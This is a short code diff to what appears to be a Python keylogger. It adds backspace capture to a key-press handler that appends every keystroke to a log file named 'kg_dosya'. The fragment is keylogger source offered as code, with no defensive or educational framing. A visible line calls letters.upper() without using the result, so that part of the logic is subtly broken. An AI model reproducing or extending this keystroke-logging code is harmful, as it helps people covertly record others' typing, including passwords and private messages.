@@ -12,6 +12,8 @@ def on_press(key):
         letters = "\n"
     if key == Key.shift_l or key == Key.shift_r:
         letters.upper()
+    if key == Key.backspace:
+        letters = "<backspace>"
     if key == Key.esc:
         letters = ""
     with open(kg_dosya, "a", encoding="utf-8") as f:
